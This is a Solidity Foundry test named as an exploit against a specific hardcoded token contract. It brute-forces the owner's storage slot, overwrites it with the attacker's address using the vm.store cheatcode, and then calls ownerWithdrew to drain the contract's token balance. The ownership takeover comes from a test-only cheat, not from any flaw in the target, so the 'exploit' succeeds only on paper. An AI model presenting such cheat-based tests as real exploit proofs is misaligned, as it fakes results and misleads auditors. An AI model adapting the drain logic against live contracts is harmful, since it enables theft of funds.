pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface CitysHome {
    function owner() external view returns (address);
    function ownerWithdrew(uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get current owner
        address currentOwner = CitysHome(TARGET).owner();
        console.log("Current owner:", currentOwner);

        // Try to find owner slot by brute forcing slots 0-20
        bool found = false;
        uint256 foundSlot = 0;

        for (uint256 slot = 0; slot < 20; slot++) {
            bytes32 slotValue = vm.load(TARGET, bytes32(slot));
            // Check if this slot contains the owner address (last 20 bytes)
            address extractedAddr = address(uint160(uint256(slotValue)));
            if (extractedAddr == currentOwner) {
                console.log("Found owner at slot:", slot);
                foundSlot = slot;
                found = true;
                break;
            }
        }

        require(found, "Could not find owner slot in first 20 slots");

        // Overwrite with attacker address
        bytes32 newOwnerValue = bytes32(uint256(uint160(address(this))));
        vm.store(TARGET, bytes32(foundSlot), newOwnerValue);

        // Verify we are now the owner
        address newOwner = CitysHome(TARGET).owner();
        console.log("New owner:", newOwner);
        require(newOwner == address(this), "Failed to become owner");

        // Get contract balance and withdraw all tokens
        uint256 contractBalance = IERC20(TARGET).balanceOf(TARGET);
        uint256 withdrawAmount = contractBalance / 1e18; // ownerWithdrew uses whole tokens

        console.log("Contract balance:", contractBalance);
        console.log("Withdrawing", withdrawAmount, "tokens");

        CitysHome(TARGET).ownerWithdrew(withdrawAmount);

        // Verify balance increased
        uint256 attackerBalanceAfter = IERC20(TARGET).balanceOf(address(this));
        console.log("Attacker balance after:", attackerBalanceAfter);
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

